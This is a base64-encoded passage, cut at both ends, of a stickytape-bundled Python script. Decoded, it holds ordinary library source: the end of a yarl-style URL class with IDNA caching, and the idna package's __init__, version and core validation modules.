ZSBsZWFkaW5nIFwnL1wnXHJcbiAgICAgICAgcmV0dXJuIFVSTChcclxuICAgICAgICAgICAgc2VsZi5fdmFsLl9yZXBsYWNlKHBhdGg9Ii8iLmpvaW4ocGFydHMpLCBxdWVyeT0iIiwgZnJhZ21lbnQ9IiIpLFxyXG4gICAgICAgICAgICBlbmNvZGVkPVRydWUsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBqb2luKHNlbGYsIHVybCk6XHJcbiAgICAgICAgIiIiSm9pbiBVUkxzXHJcblxyXG4gICAgICAgIENvbnN0cnVjdCBhIGZ1bGwgKFx4ZTJceDgwXHg5Y2Fic29sdXRlXHhlMlx4ODBceDlkKSBVUkwgYnkgY29tYmluaW5nIGEgXHhlMlx4ODBceDljYmFzZSBVUkxceGUyXHg4MFx4OWRcclxuICAgICAgICAoc2VsZikgd2l0aCBhbm90aGVyIFVSTCAodXJsKS5cclxuXHJcbiAgICAgICAgSW5mb3JtYWxseSwgdGhpcyB1c2VzIGNvbXBvbmVudHMgb2YgdGhlIGJhc2UgVVJMLCBpblxyXG4gICAgICAgIHBhcnRpY3VsYXIgdGhlIGFkZHJlc3Npbmcgc2NoZW1lLCB0aGUgbmV0d29yayBsb2NhdGlvbiBhbmRcclxuICAgICAgICAocGFydCBvZikgdGhlIHBhdGgsIHRvIHByb3ZpZGUgbWlzc2luZyBjb21wb25lbnRzIGluIHRoZVxyXG4gICAgICAgIHJlbGF0aXZlIFVSTC5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgIyBTZWUgZG9jcyBmb3IgdXJsbGliLnBhcnNlLnVybGpvaW5cclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh1cmwsIFVSTCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigidXJsIHNob3VsZCBiZSBVUkwiKVxyXG4gICAgICAgIHJldHVybiBVUkwodXJsam9pbihzdHIoc2VsZiksIHN0cih1cmwpKSwgZW5jb2RlZD1UcnVlKVxyXG5cclxuICAgIGRlZiBodW1hbl9yZXByKHNlbGYpOlxyXG4gICAgICAgICIiIlJldHVybiBkZWNvZGVkIGh1bWFuIHJlYWRhYmxlIHN0cmluZyBmb3IgVVJMIHJlcHJlc2VudGF0aW9uLiIiIlxyXG4gICAgICAgIHVzZXIgPSBfaHVtYW5fcXVvdGUoc2VsZi51c2VyLCAiIy86P0AiKVxyXG4gICAgICAgIHBhc3N3b3JkID0gX2h1bWFuX3F1b3RlKHNlbGYucGFzc3dvcmQsICIjLzo/QCIpXHJcbiAgICAgICAgaG9zdCA9IHNlbGYuaG9zdFxyXG4gICAgICAgIGlmIGhvc3Q6XHJcbiAgICAgICAgICAgIGhvc3QgPSBzZWxmLl9lbmNvZGVfaG9zdChzZWxmLmhvc3QsIGh1bWFuPVRydWUpXHJcbiAgICAgICAgcGF0aCA9IF9odW1hbl9xdW90ZShzZWxmLnBhdGgsICIjPyIpXHJcbiAgICAgICAgcXVlcnlfc3RyaW5nID0gIiYiLmpvaW4oXHJcbiAgICAgICAgICAgICJ7fT17fSIuZm9ybWF0KF9odW1hbl9xdW90ZShrLCAiIyYrOz0iKSwgX2h1bWFuX3F1b3RlKHYsICIjJis7PSIpKVxyXG4gICAgICAgICAgICBmb3IgaywgdiBpbiBzZWxmLnF1ZXJ5Lml0ZW1zKClcclxuICAgICAgICApXHJcbiAgICAgICAgZnJhZ21lbnQgPSBfaHVtYW5fcXVvdGUoc2VsZi5mcmFnbWVudCwgIiIpXHJcbiAgICAgICAgcmV0dXJuIHVybHVuc3BsaXQoXHJcbiAgICAgICAgICAgIFNwbGl0UmVzdWx0KFxyXG4gICAgICAgICAgICAgICAgc2VsZi5zY2hlbWUsXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9tYWtlX25ldGxvYyhcclxuICAgICAgICAgICAgICAgICAgICB1c2VyLFxyXG4gICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkLFxyXG4gICAgICAgICAgICAgICAgICAgIGhvc3QsXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fdmFsLnBvcnQsXHJcbiAgICAgICAgICAgICAgICAgICAgZW5jb2RlX2hvc3Q9RmFsc2UsXHJcbiAgICAgICAgICAgICAgICApLFxyXG4gICAgICAgICAgICAgICAgcGF0aCxcclxuICAgICAgICAgICAgICAgIHF1ZXJ5X3N0cmluZyxcclxuICAgICAgICAgICAgICAgIGZyYWdtZW50LFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmRlZiBfaHVtYW5fcXVvdGUocywgdW5zYWZlKTpcclxuICAgIGlmIG5vdCBzOlxyXG4gICAgICAgIHJldHVybiBzXHJcbiAgICBmb3IgYyBpbiAiJSIgKyB1bnNhZmU6XHJcbiAgICAgICAgaWYgYyBpbiBzOlxyXG4gICAgICAgICAgICBzID0gcy5yZXBsYWNlKGMsICIlezowMlh9Ii5mb3JtYXQob3JkKGMpKSlcclxuICAgIGlmIHMuaXNwcmludGFibGUoKTpcclxuICAgICAgICByZXR1cm4gc1xyXG4gICAgcmV0dXJuICIiLmpvaW4oYyBpZiBjLmlzcHJpbnRhYmxlKCkgZWxzZSBxdW90ZShjKSBmb3IgYyBpbiBzKVxyXG5cclxuXHJcbl9NQVhDQUNIRSA9IDI1NlxyXG5cclxuXHJcbkBmdW5jdG9vbHMubHJ1X2NhY2hlKF9NQVhDQUNIRSlcclxuZGVmIF9pZG5hX2RlY29kZShyYXcpOlxyXG4gICAgdHJ5OlxyXG4gICAgICAgIHJldHVybiBpZG5hLmRlY29kZShyYXcuZW5jb2RlKCJhc2NpaSIpKVxyXG4gICAgZXhjZXB0IFVuaWNvZGVFcnJvcjogICMgZS5nLiBcJzo6MVwnXHJcbiAgICAgICAgcmV0dXJuIHJhdy5lbmNvZGUoImFzY2lpIikuZGVjb2RlKCJpZG5hIilcclxuXHJcblxyXG5AZnVuY3Rvb2xzLmxydV9jYWNoZShfTUFYQ0FDSEUpXHJcbmRlZiBfaWRuYV9lbmNvZGUoaG9zdCk6XHJcbiAgICB0cnk6XHJcbiAgICAgICAgcmV0dXJuIGlkbmEuZW5jb2RlKGhvc3QsIHV0czQ2PVRydWUpLmRlY29kZSgiYXNjaWkiKVxyXG4gICAgZXhjZXB0IFVuaWNvZGVFcnJvcjpcclxuICAgICAgICByZXR1cm4gaG9zdC5lbmNvZGUoImlkbmEiKS5kZWNvZGUoImFzY2lpIilcclxuXHJcblxyXG5AcmV3cml0ZV9tb2R1bGVcclxuZGVmIGNhY2hlX2NsZWFyKCk6XHJcbiAgICBfaWRuYV9kZWNvZGUuY2FjaGVfY2xlYXIoKVxyXG4gICAgX2lkbmFfZW5jb2RlLmNhY2hlX2NsZWFyKClcclxuXHJcblxyXG5AcmV3cml0ZV9tb2R1bGVcclxuZGVmIGNhY2hlX2luZm8oKTpcclxuICAgIHJldHVybiB7XHJcbiAgICAgICAgImlkbmFfZW5jb2RlIjogX2lkbmFfZW5jb2RlLmNhY2hlX2luZm8oKSxcclxuICAgICAgICAiaWRuYV9kZWNvZGUiOiBfaWRuYV9kZWNvZGUuY2FjaGVfaW5mbygpLFxyXG4gICAgfVxyXG5cclxuXHJcbkByZXdyaXRlX21vZHVsZVxyXG5kZWYgY2FjaGVfY29uZmlndXJlKCosIGlkbmFfZW5jb2RlX3NpemU9X01BWENBQ0hFLCBpZG5hX2RlY29kZV9zaXplPV9NQVhDQUNIRSk6XHJcbiAgICBnbG9iYWwgX2lkbmFfZGVjb2RlLCBfaWRuYV9lbmNvZGVcclxuXHJcbiAgICBfaWRuYV9lbmNvZGUgPSBmdW5jdG9vbHMubHJ1X2NhY2hlKGlkbmFfZW5jb2RlX3NpemUpKF9pZG5hX2VuY29kZS5fX3dyYXBwZWRfXylcclxuICAgIF9pZG5hX2RlY29kZSA9IGZ1bmN0b29scy5scnVfY2FjaGUoaWRuYV9kZWNvZGVfc2l6ZSkoX2lkbmFfZGVjb2RlLl9fd3JhcHBlZF9fKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnaWRuYS9fX2luaXRfXy5weScsIGInZnJvbSAucGFja2FnZV9kYXRhIGltcG9ydCBfX3ZlcnNpb25fX1xuZnJvbSAuY29yZSBpbXBvcnQgKFxuICAgIElETkFCaWRpRXJyb3IsXG4gICAgSUROQUVycm9yLFxuICAgIEludmFsaWRDb2RlcG9pbnQsXG4gICAgSW52YWxpZENvZGVwb2ludENvbnRleHQsXG4gICAgYWxhYmVsLFxuICAgIGNoZWNrX2JpZGksXG4gICAgY2hlY2tfaHlwaGVuX29rLFxuICAgIGNoZWNrX2luaXRpYWxfY29tYmluZXIsXG4gICAgY2hlY2tfbGFiZWwsXG4gICAgY2hlY2tfbmZjLFxuICAgIGRlY29kZSxcbiAgICBlbmNvZGUsXG4gICAgdWxhYmVsLFxuICAgIHV0czQ2X3JlbWFwLFxuICAgIHZhbGlkX2NvbnRleHRqLFxuICAgIHZhbGlkX2NvbnRleHRvLFxuICAgIHZhbGlkX2xhYmVsX2xlbmd0aCxcbiAgICB2YWxpZF9zdHJpbmdfbGVuZ3RoLFxuKVxuZnJvbSAuaW50cmFuZ2VzIGltcG9ydCBpbnRyYW5nZXNfY29udGFpblxuXG5fX2FsbF9fID0gW1xuICAgICJJRE5BQmlkaUVycm9yIixcbiAgICAiSUROQUVycm9yIixcbiAgICAiSW52YWxpZENvZGVwb2ludCIsXG4gICAgIkludmFsaWRDb2RlcG9pbnRDb250ZXh0IixcbiAgICAiYWxhYmVsIixcbiAgICAiY2hlY2tfYmlkaSIsXG4gICAgImNoZWNrX2h5cGhlbl9vayIsXG4gICAgImNoZWNrX2luaXRpYWxfY29tYmluZXIiLFxuICAgICJjaGVja19sYWJlbCIsXG4gICAgImNoZWNrX25mYyIsXG4gICAgImRlY29kZSIsXG4gICAgImVuY29kZSIsXG4gICAgImludHJhbmdlc19jb250YWluIixcbiAgICAidWxhYmVsIixcbiAgICAidXRzNDZfcmVtYXAiLFxuICAgICJ2YWxpZF9jb250ZXh0aiIsXG4gICAgInZhbGlkX2NvbnRleHRvIixcbiAgICAidmFsaWRfbGFiZWxfbGVuZ3RoIixcbiAgICAidmFsaWRfc3RyaW5nX2xlbmd0aCIsXG5dXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnaWRuYS9wYWNrYWdlX2RhdGEucHknLCBiIl9fdmVyc2lvbl9fID0gJzMuMydcblxuIikKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2lkbmEvY29yZS5weScsIGInZnJvbSAuIGltcG9ydCBpZG5hZGF0YVxuaW1wb3J0IGJpc2VjdFxuaW1wb3J0IHVuaWNvZGVkYXRhXG5pbXBvcnQgcmVcbmZyb20gdHlwaW5nIGltcG9ydCBVbmlvbiwgT3B0aW9uYWxcbmZyb20gLmludHJhbmdlcyBpbXBvcnQgaW50cmFuZ2VzX2NvbnRhaW5cblxuX3ZpcmFtYV9jb21iaW5pbmdfY2xhc3MgPSA5XG5fYWxhYmVsX3ByZWZpeCA9IGJcJ3huLS1cJ1xuX3VuaWNvZGVfZG90c19yZSA9IHJlLmNvbXBpbGUoXCdbXFx1MDAyZVxcdTMwMDJcXHVmZjBlXFx1ZmY2MV1cJylcblxuY2xhc3MgSUROQUVycm9yKFVuaWNvZGVFcnJvcik6XG4gICAgIiIiIEJhc2UgZXhjZXB0aW9uIGZvciBhbGwgSUROQS1lbmNvZGluZyByZWxhdGVkIHByb2JsZW1zICIiIlxuICAgIHBhc3NcblxuXG5jbGFzcyBJRE5BQmlkaUVycm9yKElETkFFcnJvcik6XG4gICAgIiIiIEV4Y2VwdGlvbiB3aGVuIGJpZGlyZWN0aW9uYWwgcmVxdWlyZW1lbnRzIGFyZSBub3Qgc2F0aXNmaWVkICIiIlxuICAgIHBhc3NcblxuXG5jbGFzcyBJbnZhbGlkQ29kZXBvaW50KElETkFFcnJvcik6XG4gICAgIiIiIEV4Y2VwdGlvbiB3aGVuIGEgZGlzYWxsb3dlZCBvciB1bmFsbG9jYXRlZCBjb2RlcG9pbnQgaXMgdXNlZCAiIiJcbiAgICBwYXNzXG5cblxuY2xhc3MgSW52YWxpZENvZGVwb2ludENvbnRleHQoSUROQUVycm9yKTpcbiAgICAiIiIgRXhjZXB0aW9uIHdoZW4gdGhlIGNvZGVwb2ludCBpcyBub3QgdmFsaWQgaW4gdGhlIGNvbnRleHQgaXQgaXMgdXNlZCAiIiJcbiAgICBwYXNzXG5cblxuZGVmIF9jb21iaW5pbmdfY2xhc3MoY3A6IGludCkgLT4gaW50OlxuICAgIHYgPSB1bmljb2RlZGF0YS5jb21iaW5pbmcoY2hyKGNwKSlcbiAgICBpZiB2ID09IDA6XG4gICAgICAgIGlmIG5vdCB1bmljb2RlZGF0YS5uYW1lKGNocihjcCkpOlxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcJ1Vua25vd24gY2hhcmFjdGVyIGluIHVuaWNvZGVkYXRhXCcpXG4gICAgcmV0dXJuIHZcblxuZGVmIF9pc19zY3JpcHQoY3A6IHN0ciwgc2NyaXB0OiBzdHIpIC0+IGJvb2w6XG4gICAgcmV0dXJuIGludHJhbmdlc19jb250YWluKG9yZChjcCksIGlkbmFkYXRhLnNjcmlwdHNbc2NyaXB0XSlcblxuZGVmIF9wdW55Y29kZShzOiBzdHIpIC0+IGJ5dGVzOlxuICAgIHJldHVybiBzLmVuY29kZShcJ3B1bnljb2RlXCcpXG5cbmRlZiBfdW5vdChzOiBpbnQpIC0+IHN0cjpcbiAgICByZXR1cm4gXCdVK3s6MDRYfVwnLmZvcm1hdChzKVxuXG5cbmRlZiB2YWxpZF9sYWJlbF9sZW5ndGgobGFiZWw6IFVuaW9uW2J5dGVzLCBzdHJdKSAtPiBib29sOlxuICAgIGlmIGxlbihsYWJlbCkgPiA2MzpcbiAgICAgICAgcmV0dXJuIEZhbHNlXG4gICAgcmV0dXJuIFRydWVcblxuXG5kZWYgdmFsaWRfc3RyaW5nX2xlbmd0aChsYWJlbDogVW5pb25bYnl0ZXMsIHN0cl0sIHRyYWlsaW5nX2RvdDogYm9vbCkgLT4gYm9vbDpcbiAgICBpZiBsZW4obGFiZWwpID4gKDI1NCBpZiB0cmFpbGluZ19kb3QgZWxzZSAyNTMpOlxuICAgICAgICByZXR1cm4gRmFsc2VcbiAgICByZXR1cm4gVHJ1ZVxuXG5cbmRlZiBjaGVja19iaWRpKGxhYmVsOiBzdHIsIGNoZWNrX2x0cjogYm9vbCA9IEZhbHNlKSAtPiBib29sOlxuICAgICMgQmlkaSBydWxlcyBzaG91bGQgb25seSBiZSBhcHBsaWVkIGlmIHN0cmluZyBjb250YWlucyBSVEwgY2hhcmFjdGVyc1xuICAgIGJpZGlfbGFiZWwgPSBGYWxzZVxuICAgIGZvciAoaWR4LCBjcCkgaW4gZW51bWVyYXRlKGxhYmVsLCAxKTpcbiAgICAgICAgZGlyZWN0aW9uID0gdW5pY29kZWRhdGEuYmlkaXJlY3Rpb25hbChjcClcbiAgICAgICAgaWYgZGlyZWN0aW9uID09IFwnXCc6XG4gICAgICAgICAgICAjIFN0cmluZyBsaWtlbHkgY29tZXMgZnJvbSBhIG5ld2VyIHZlcnNpb24gb2YgVW5pY29kZVxuICAgICAgICAgICAgcmFpc2UgSUROQUJpZGlFcnJvcihcJ1Vua25vd24gZGlyZWN0aW9uYWxpdHkgaW4gbGFiZWwge30gYXQgcG9zaXRpb24ge31cJy5mb3JtYXQocmVwcihsYWJlbCksIGlkeCkpXG4gICAgICAgIGlmIGRpcmVjdGlvbiBpbiBbXCdSXCcsIFwnQUxcJywgXCdBTlwnXTpcbiAgICAgICAgICAgIGJpZGlfbGFiZWwgPSBUcnVlXG4gICAgaWYgbm90IGJpZGlfbGFiZWwgYW5kIG5vdCBjaGVja19sdHI6XG4gICAgICAgIHJldHVybiBUcnVlXG5cbiAgICAjIEJpZGkgcnVsZSAxXG4gICAgZGlyZWN0aW9uID0gdW5pY29kZWRhdGEuYmlkaXJlY3Rpb25hbChsYWJlbFswXSlcbiAgICBpZiBkaXJlY3Rpb24gaW4gW1wnUlwnLCBcJ0FMXCddOlxuICAgICAgICBydGwgPSBUcnVlXG4gICAgZWxpZiBkaXJlY3Rpb24gPT0gXCdMXCc6XG4gICAgICAgIHJ0bCA9IEZhbHNlXG4gICAgZWxzZTpcbiAgICAgICAgcmFpc2UgSUROQUJpZGlFcnJvcihcJ0ZpcnN0IGNvZGVwb2ludCBpbiBsYWJlbCB7fSBtdXN0IGJlIGRpcmVjdGlvbmFsaXR5IEwsIFIgb3IgQUxcJy5mb3JtYXQocmVwcihsYWJlbCkpKVxuXG4gICAgdmFsaWRfZW5kaW5nID0gRmFsc2VcbiAgICBudW1iZXJfdHlwZSA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbc3RyXVxuICAgIGZvciAoaWR4LCBjcCkgaW4gZW51bWVyYXRlKGxhYmVsLCAxKTpcbiAgICAgICAgZGlyZWN0aW9uID0gdW5pY29kZWRhdGEuYmlkaXJlY3Rpb25hbChjcClcblxuICAgICAgICBpZiBydGw6XG4gICAgICAgICAgICAjIEJpZGkgcnVsZSAyXG4gICAgICAgICAgICBpZiBub3QgZGlyZWN0aW9uIGluIFtcJ1JcJywgXCdBTFwnLCBcJ0FOXCcsIFwnRU5cJywgXCdFU1wnLCBcJ0NTXCcsIFwnRVRcJywgXCdPTlwnLCBcJ0JOXCcsIFwnTlNNXCddOlxuICAgICAgICAgICAgICAgIHJhaXNlIElETkFCaWRpRXJyb3IoXCdJbnZhbGlkIGRpcmVjdGlvbiBmb3IgY29kZXBvaW50IGF0IHBvc2l0aW9uIHt9IGluIGEgcmlnaHQtdG8tbGVmdCBsYWJlbFwnLmZvcm1hdChpZHgpKVxuICAgICAgICAgICAgIyBCaWRpIHJ1bGUgM1xuICAgICAgICAgICAgaWYgZGlyZWN0aW9uIGluIFtcJ1JcJywgXCdBTFwnLCBcJ0VOXCcsIFwnQU5cJ106XG4gICAgICAgICAgICAgICAgdmFsaWRfZW5kaW5nID0gVHJ1ZVxuICAgICAgICAgICAgZWxpZiBkaXJlY3Rpb24gIT0gXCdOU01cJzpcbiAgICAgICAgICAgICAgICB2YWxpZF9lbmRpbmcgPSBGYWxzZVxuICAgICAgICAgICAgIyBCaWRpIHJ1bGUgNFxuICAgICAgICAgICAgaWYgZGlyZWN0aW9uIGluIFtcJ0FOXCcsIFwnRU5cJ106XG4gICAgICAgICAgICAgICAgaWYgbm90IG51bWJlcl90eXBlOlxuICAgICAgICAgICAgICAgICAgICBudW1iZXJfdHlwZSA9IGRpcmVjdGlvblxuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgIGlmIG51bWJlcl90eXBlICE9IGRpcmVjdGlvbjpcbiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIElETkFCaWRpRXJyb3IoXCdDYW4gbm90IG1peCBudW1lcmFsIHR5cGVzIGluIGEgcmlnaHQtdG8tbGVmdCBsYWJlbFwnKVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgIyBCaWRpIHJ1bGUgNVxuICAgICAgICAgICAgaWYgbm90IGRpcmVjdGlvbiBpbiBbXCdMXCcsIFwnRU5cJywgXCdFU1wnLCBcJ0NTXCcsIFwnRVRcJywgXCdPTlwnLCBcJ0JOXCcsIFwnTlNNXCddOlxuICAgICAgICAgICAgICAgIHJhaXNlIElETkFCaWRpRXJyb3IoXCdJbnZhbGlkIGRpcmVjdGlvbiBmb3IgY29kZXBvaW50IGF0IHBvc2l0aW9uIHt9IGluIGEgbGVmdC10by1yaWdodCBsYWJlbFwnLmZvcm1hdChpZHgpKVxuICAgICAgICAgICAgIyBCaWRpIHJ1bGUgNlxuICAgICAgICAgICAgaWYgZGlyZWN0aW9uIGluIFtcJ0xcJywgXCdFTlwnXTpcbiAgICAgICAgICAgICAgICB2YWxpZF9lbmRpbmcgPSBUcnVlXG4gICAgICAgICAgICBlbGlmIGRpcmVjdGlvbiAhPSBcJ05TTVwnOlxuICAgICAgICAgICAgICAgIHZhbGlkX2VuZGluZyA9IEZhbHNlXG5cbiAgICBpZiBub3QgdmFsaWRfZW5kaW5nOlxuICAgICAgICByYWlzZSBJRE5BQmlkaUVycm9yKFwnTGFiZWwgZW5kcyB3aXRoIGlsbGVnYWwgY29kZXBvaW50IGRpcmVjdGlvbmFsaXR5XCcpXG5cbiAgICByZXR1cm4gVHJ1ZVxuXG5cbmRlZiBjaGVja19pbml0aWFsX2NvbWJpbmVyKGxhYmVsOiBzdHIpIC0+IGJvb2w6XG4gICAgaWYgdW5pY29kZWRhdGEuY2F0ZWdvcnkobGFiZWxbMF0pWzBdID09IFwnTVwnOlxuICAgICAgICByYWlzZSBJRE5BRXJyb3IoXCdMYWJlbCBiZWdpbnMgd2l0aCBhbiBpbGxlZ2FsIGNvbWJpbmluZyBjaGFyYWN0ZXJcJylcbiAgICByZXR1cm4gVHJ1ZVxuXG5cbmRlZiBjaGVja19oeXBoZW5fb2sobGFiZWw6IHN0cikgLT4gYm9vbDpcbiAgICBpZiBsYWJlbFsyOjRdID09IFwnLS1cJzpcbiAgICAgICAgcmFpc2UgSUROQUVycm9yKFwnTGFiZWwgaGFzIGRpc2FsbG93ZWQgaHlwaGVucyBpbiAzcmQgYW5kIDR0aCBwb3NpdGlvblwnKVxuICAgIGlmIGxhYmVsWzBdID09IFwnLVwnIG9yIGxhYmVsWy0xXSA9PSBcJy1cJzpcbiAgICAgICAgcmFpc2UgSUROQUVycm9yKFwnTGFiZWwgbXVzdCBub3Qgc3RhcnQgb3IgZW5kIHdpdGggYSBoeXBoZW5cJylcbiAgICByZXR1cm4gVHJ1ZVxuXG5cbmRlZiBjaGVja19uZmMobGFiZWw6IHN0cikgLT4gTm9uZTpcbiAgICBpZiB1bmljb2RlZGF0YS5ub3JtYWxpemUoXCdORkNcJywgbGFiZWwpICE9IGxhYmVsOlxuICAgICAgICByYWlzZSBJRE5BRXJyb3IoXCdMYWJlbCBtdXN0IGJlIGluIE5vcm1hbGl6YXRpb24gRm9ybSBDXCcpXG5cblxuZGVmIHZhbGlkX2NvbnRleHRqKGxhYmVsOiBzdHIsIHBvczogaW50KSAtPiBib29sOlxuICAgIGNwX3ZhbHVlID0gb3JkKGxhYmVsW3Bvc10pXG5cbiAgICBpZiBjcF92YWx1ZSA9PSAweDIwMGM6XG5cbiAgICAgICAgaWYgcG9zID4gMDpcbiAgICAgICAgICAgIGlmIF9jb21iaW5pbmdfY2xhc3Mob3JkKGxhYmVsW3BvcyAtIDFdKSkgPT0gX3ZpcmFtYV9jb21iaW5pbmdfY2xhc3M6XG4gICAgICAgICAgICAgICAgcmV0dXJuIFRydWVcblxuICAgICAgICBvayA9IEZhbHNlXG4gICAgICAgIGZvciBpIGluIHJhbmdlKHBvcy0xLCAtMSwgLTEpOlxuICAgICAgICAgICAgam9pbmluZ190eXBlID0gaWRuYWRhdGEuam9pbmluZ190eXBlcy5nZXQob3JkKGxhYmVsW2ldKSlcbiAgICAgICAgICAgIGlmIGpvaW5pbmdfdHlwZSA9PSBvcmQoXCdUXCcpOlxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXG4gICAgICAgICAgICBpZiBqb2luaW5nX3R5cGUgaW4gW29yZChcJ0xcJyksIG9yZChcJ0RcJyldOlxuICAgICAgICAgICAgICAgIG9rID0gVHJ1ZVxuICAgICAgICAgICAgICAgIGJyZWFrXG5cbiAgICAgICAgaWYgbm90IG9rOlxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICAgICAgb2sgPSBGYWxzZVxuICAgICAgICBmb3IgaSBpbiByYW5nZShwb3MrMSwgbGVuKGxhYmVsKSk6XG4gICAgICAgICAgICBqb2luaW5nX3R5cGUgPSBpZG5hZGF0YS5qb2luaW5nX3R5cGVzLmdldChvcmQobGFiZWxbaV0pKVxuICAgICAgICAgICAgaWYgam9pbmluZ190eXBlID09IG9yZChcJ1RcJyk6XG4gICAgICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgICAgIGlmIGpvaW5pbmdfdHlwZSBpbiBbb3JkKFwnUlwnKSwgb3JkKFwnRFwnKV06XG4gICAgICAgICAgICAgICAgb2sgPSBUcnVlXG4gICAgICAgICAgICAgICAgYnJlYWtcbiAgICAgICAgcmV0dXJuIG9rXG5cbiAgICBpZiBjcF92YWx1ZSA9PSAweDIwMGQ6XG5cbiAgICAgICAgaWYgcG9zID4gMDpcbiAgICAgICAgICAgIGlmIF9jb21iaW5pbmdfY2xhc3Mob3JkKGxhYmVsW3BvcyAtIDFdKSkgPT0gX3ZpcmFtYV9jb21iaW5pbmdfY2xhc3M6XG4gICAgICAgICAgICAgICAgcmV0dXJuIFRydWVcbiAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICBlbHNlOlxuXG4gICAgICAgIHJldHVybiBGYWxzZVxuXG5cbmRlZiB2YWxpZF9jb250ZXh0byhsYWJlbDogc3RyLCBwb3M6IGludCwgZXhjZXB0aW9uOiBib29sID0gRmFsc2UpIC0+IGJvb2w6XG4gICAgY3BfdmFsdWUgPSBvcmQobGFiZWxbcG9zXSlcblxuICAgIGlmIGNwX3ZhbHVlID09IDB4MDBiNzpcbiAgICAgICAgaWYgMCA8IHBvcyA8IGxlbihsYWJlbCktMTpcbiAgICAgICAgICAgIGlmIG9yZChsYWJlbFtwb3MgLSAxXSkgPT0gMHgwMDZjIGFuZCBvcmQobGFiZWxbcG9zICsgMV0pID09IDB4MDA2YzpcbiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZVxuICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgIGVsaWYgY3BfdmFsdWUgPT0gMHgwMzc1OlxuICAgICAgICBpZiBwb3MgPCBsZW4obGFiZWwpLTEgYW5kIGxlbihsYWJlbCkgPiAxOlxuICAgICAgICAgICAgcmV0dXJuIF9pc19zY3JpcHQobGFiZWxbcG9zICsgMV0sIFwnR3JlZWtcJylcbiAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICBlbGlmIGNwX3ZhbHVlID09IDB4MDVmMyBvciBjcF92YWx1ZSA9PSAweDA1ZjQ6XG4gICAgICAgIGlmIHBvcyA+IDA6XG4gICAgICAgICAgICByZXR1cm4gX2lzX3NjcmlwdChsYWJlbFtwb3MgLSAxXSwgXCdIZWJyZXdcJylcbiAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICBlbGlmIGNwX3ZhbHVlID09IDB4MzBmYjpcbiAgICAgICAgZm9yIGNwIGluIGxhYmVsOlxuICAgICAgICAgICAgaWYgY3AgPT0gXCdcXHUzMGZiXCc6XG4gICAgICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgICAgIGlmIF9pc19zY3JpcHQoY3AsIFwnSGlyYWdhbmFcJykgb3IgX2lzX3NjcmlwdChjcCwgXCdLYXRha2FuYVwnKSBvciBfaXNfc2NyaXB0KGNwLCBcJ0hhblwnKTpcbiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZVxuICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgIGVsaWYgMHg2NjAgPD0gY3BfdmFsdWUgPD0gMHg2Njk6XG4gICAgICAgIGZvciBjcCBpbiBsYWJlbDpcbiAgICAgICAgICAgIGlmIDB4NmYwIDw9IG9yZChjcCkgPD0gMHgwNmY5OlxuICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZVxuICAgICAgICByZXR1cm4gVHJ1ZVxuXG4gICAgZWxpZiAweDZmMCA8PSBjcF92YWx1ZSA8PSAweDZmOTpcbiAgICAgICAgZm9yIGNwIGluIGxhYmVsOlxuICAgICAgICAgICAgaWYgMHg2NjAgPD0gb3JkKGNwKSA8PSAweDA2Njk6XG4gICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlXG4gICAgICAgIHJldHVybiBUcnVlXG5cbiAgICByZXR1cm4gRmFsc2VcblxuXG5kZWYgY2hlY2tfbGFiZWwobGFiZWw6IFVuaW9uW3N0ciwgYnl0ZXMsIGJ5dGVhcnJheV0pIC0+IE5vbmU6XG4gICAgaWYgaXNpbnN0YW5jZShsYWJlbCwgKGJ5dGVzLCBieXRlYXJyYXkpKTpcbiAgICAgICAgbGFiZWwgPSBsYWJlbC5kZWNvZGUoXCd1dGYtOFwnKVxuICAgIGlmIGxlbihsYWJlbCkgPT0gMDpcbiAgICAgICAgcmFpc2UgSUROQUVycm9yKFwnRW1wdHkgTGFiZWxcJylcblxuICAgIGNoZWNrX25mYyhsYWJlbClcbiAgICBjaGVja19oeXBoZW5fb2sobGFiZWwpXG4gICAgY2hlY2tfaW5pdGlhbF9jb21iaW5lcihsYWJlbClcblxuICAgIGZvciAocG9zLCBjcCkgaW4gZW51bWVyYXRlKGxhYmVsKTpcbiAgICAgICAgY3BfdmFsdWUgPSBvcmQoY3ApXG4gICAgICAgIGlmIGludHJhbmdlc19jb250YWluKGNwX3ZhbHVlLCBpZG5hZGF0YS5jb2RlcG9pbnRfY2xhc3Nlc1tcJ1BWQUxJRFwnXSk6XG4gICAgICAgICAgICBjb250aW51ZVxuICAgICAgICBlbGlmIGludHJhbmdlc19jb250YWluKGNwX3ZhbHVlLCBpZG5hZGF0YS5jb2RlcG9pbnRfY2xhc3Nlc1tcJ0NPTlRFWFRKXCddKTpcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBpZiBub3QgdmFsaWRfY29udGV4dGoobGFiZWwsIHBvcyk6XG4gICAgICAgICAgICAgICAgICAgIHJhaXNlIEludmFsaWRDb2RlcG9pbnRDb250ZXh0KFw